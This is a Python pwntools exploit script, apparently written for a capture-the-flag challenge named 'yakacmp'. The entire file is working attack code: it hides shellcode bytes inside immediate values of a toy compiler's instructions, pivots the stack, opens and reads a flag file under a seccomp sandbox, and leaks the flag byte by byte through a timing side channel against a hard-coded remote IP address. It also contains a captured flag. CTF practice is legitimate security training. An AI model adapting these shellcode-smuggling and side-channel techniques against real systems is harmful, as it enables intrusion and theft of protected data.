from pwn import *
from sys import argv

context.log_level = 'ERROR'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

binary = './yakacmp'
elf = ELF(binary)
p = process(binary)


def dbg(cmd=None):
    gdb.attach(p, cmd)
    pause()


def add(r1, r2):
    return 'add ' + 'r' + str(r1) + ',' + 'r' + str(r2)


def inc(r1, n):
    return 'add ' + 'r' + str(r1) + ',' + str(n)


def sub(r1, r2):
    return 'sub ' + 'r' + str(r1) + ',' + 'r' + str(r2)


def dec(r1, n):
    return 'sub ' + 'r' + str(r1) + ',' + str(n)


def chg(r1, r2):
    return 'chg ' + 'r' + str(r1) + ',' + 'r' + str(r2)


def mov(r1, r2):
    return 'mov ' + 'r' + str(r1) + ',' + 'r' + str(r2)


def xor(r1):
    return 'mov ' + 'r' + str(r1) + ',0'


def movabs(r1, val):
    return 'mov ' + 'r' + str(r1) + ',' + str(val)


def push_pop(r1, val):
    return 'mov ' + 'r' + str(r1) + ',' + str(val)


# useful code
'''
flag = 0x67616c66
flag = 0x7478742e67616c66
syscall = 0x050f
ret = 0xc3
push_rax = 0x50
push_rbx = 0x53
push_rsp = 0x54
pop_rax = 0x58
pop_rbx = 0x5b
pop_rbp = 0x5b
pop_rsp = 0x5c
pop_rdi = 0x5f
pop_rsi = 0x5e
pop_rdx = 0x5a
pop_rsi = 0x5E
'''
mmap_addr = 0x23330000
flag_addr = 0x23330400
magic_syscall = 0x5f90050f23330000
syscall = 0x050f
pop_rdi = 0x5f00000000

push_rsp_pop_rbx = 0x5b54909023330000
sub_rbx_rax = sub(2, 1)
push_rbx_pop_rsp_pop_rbx = 0x5a5c539023330000

pop_rsp_pop_rdi = 0x505f5c9023330400

push_flag = 0x5050030067616c66
pop4_rdx = 0x5a5a5a5a23330400

# flag open, read, cmp byte, exit or loop
'''
mov rdi, flag_addr
mov rax, 0
syscall
push rax
pop rdi
mov rsi, buf
mov rdx, 50
mov rax, 2
syscall
mov dl, byte ptr [rsi+i]
mov cl, bychr
cmp cl, dl
jz 0x3c
xor edi, edi
pop rax, push 60
syscall
jz -0x3c
'''


def send_payload(p, offset, bychr):
    # 1. get puts address
    sl = lambda data :p.sendline(data)
    sla = lambda delim, data: p.sendlineafter(str(delim), data)
    rls = lambda num=1 :p.recvlines(num)

    sl(movabs(4, 0x18))
    sl(movabs(3, 0x36d6ad))
    for i in range(7):
        sl(movabs(1, mmap_addr))
    sl(movabs(1, 0x20))

    sl(push_pop(1, push_rsp_pop_rbx))
    sl(sub(2, 4))  # rbx = rbx- rdx

    for i in range(10):
        sl(movabs(1, mmap_addr))
    sl(push_pop(1, push_rbx_pop_rsp_pop_rbx))  # get seccomp_load

    # 2.stack privoting
    sl(push_pop(1, pop_rsp_pop_rdi))
    sl(push_pop(1, push_flag))

    # 3.open flag
    push_flag_addr_pop_rdi = 0x505f909023330400
    pop_rax_syscall_pop_rdi = 0x5f050f5800000002

    sl(push_pop(1, push_flag_addr_pop_rdi))
    sl(push_pop(1, pop_rax_syscall_pop_rdi))

    # return fd = 3

    # 4. read flag
    pop_rdi_push_rdx = 0x5252905f00000003
    pop_rsi = 0x505e909023330800
    pop_rdx = 0x505a909000000100
    pop_rax_syscall_pop_rdi = 0x5f050f5800000000

    sl(push_pop(1, pop_rdi_push_rdx))
    sl(push_pop(1, pop_rsi))
    sl(push_pop(1, pop_rdx))
    sl(push_pop(1, pop_rax_syscall_pop_rdi))

    # 5. call cmp, exit or loop
    xor_rdx_rdx = 0x58d2314800000000
    xor_rcx_rcx = 0x58c9314800000000

    # mov dl, byte ptr [rsi+i], 0x28568A
    mov_dl_rsi_chr = (0x58 << 56) + (int(offset) << 48) + 0x568a00000000

    # mov cl, bychr
    mov_cl_chr = (0x58 << 56) + (int(bychr) << 48) + 0xb19000000000

    # cmp cl, dl
    cmp_cl_dl = 0x58d1389000000000

    # jz 0x3c
    # xor edi, edi
    jnz_invalid = 0x58903a7400000000
    xor_edi = 0x58ff319000000000

    # pop rax, push 60
    # syscall
    push_pop_rax_syscall = 0x050f58900000003c

    sl(push_pop(1, xor_rdx_rdx))
    sl(push_pop(1, xor_rcx_rcx))
    sl(push_pop(1, mov_dl_rsi_chr))
    sl(push_pop(1, mov_cl_chr))
    sl(push_pop(1, cmp_cl_dl))
    sl(push_pop(1, jnz_invalid))
    sl(push_pop(1, xor_edi))
    sl(push_pop(1, push_pop_rax_syscall))

    # jz -0x3c
    jnz_invalid2 = 0x5890c27400000000

    sl(push_pop(1, jnz_invalid2))
    sla('more operation?', 'NO')
    rls(41)


# flag{633eca28-68e6-4967-ac9e-540117d4ab6e}

def pwn():
    lg = lambda s, val, ch :log.info('\033[1;31;40m %s --> 0x%x, %s \033[0m' % (s, val, ch))
    flag = ''
    offset = 0
    timeoutlimit = 0

    for offset in range(0, 0x50):
        print('\noffset', offset, '\n')
        for ch in range(0x2d, 0x7E + 1):
            try:
                # exclude special letters and uppercase letter
                if ch >= 0x3a and ch <= 0x60:
                    continue
                # exclude . /
                if ch == 0x2e or ch == 0x2f:
                    continue

                context.log_level = 'error'
                if argv[1] == 'r':
                    p = remote('39.107.137.85', 12412)
                    timeoutlimit = 2
                else:
                    p = process(binary)
                    timeoutlimit = 0.2

                p.recvuntil("welcome to Ayaka's compiler,maybe you should give me some code now\n")
                send_payload(p, offset, ch)
                context.log_level = 'info'
                str_chr = chr(ch)
                lg('ch', ch, str_chr)
                for i in range(5):
                    sleep(0.02)
                    p.sendline('\n')
                p.recv(timeout=timeoutlimit)
                flag += chr(ch)
                print("find one byte in flag :", flag)
                p.close()
                break
            except:
                try:
                    if argv[1] == 'r':
                        p.close()
                    for i in range(5):
                        p.sendline('\n')
                except:
                    try:
                        p.close()
                    except:
                        pass
        if ch == 0x7d:  # }
            break
    print("find flag:\n\n" + flag + '\n')


pwn()

# dbg(cmd)

'''
b *0x3454 +  0x555555400000 
b *0x356A + 0x555555400000
b *0x2BC5 + 0x555555400000
b *0x1AF0 + 0x555555400000
b *0x23330135
b *0x23330185
'''

'''
0x66, 0x6c, 0x61, 0x67, 0x7b, ..., 0x7d
flag{}
'''

# mark, learn machine code and open read exit timeout with sandbox